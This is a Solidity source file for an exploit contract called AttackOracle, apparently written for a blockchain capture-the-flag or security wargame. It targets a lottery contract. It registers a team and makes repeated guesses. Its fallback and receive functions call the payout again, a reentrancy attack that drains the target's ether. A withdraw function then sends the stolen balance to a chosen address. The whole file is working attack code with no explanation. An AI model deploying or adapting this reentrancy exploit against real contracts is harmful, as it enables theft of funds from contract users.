// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

interface ILottery {
    function registerTeam(address _walletAddress, string calldata _teamName, string calldata _password) external payable;
    function makeAGuess(address _team, uint256 _guess) external returns (bool);
    function payoutWinningTeam(address _team) external returns (bool);
}

contract AttackOracle { // 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A
    ILottery lottery;

    constructor(address lotteryAddress) payable {
        lottery = ILottery(lotteryAddress);
    }

    function attack() public {
        lottery.makeAGuess(address(this), 256);
        lottery.payoutWinningTeam(address(this));    
    }

    function setup() public payable {
        lottery.registerTeam{value: 1_000_000_000}(address(this), "Team_Name", "Password");

        for(uint i; i < 11 ; i++) {
            lottery.makeAGuess(address(this), 256);
            i++;       
        }
    }

    function reg() public {
        lottery.registerTeam(address(this), "333222222", "123abc");
    }

    function withdraw(address payable payout) public {
        (bool success, ) = address(payout).call{value: address(this).balance}('');
        require(success, "Failed to withdraw");
    }

    fallback() external payable {
         attack();
    }

    receive() external payable {
         attack();   
    }
}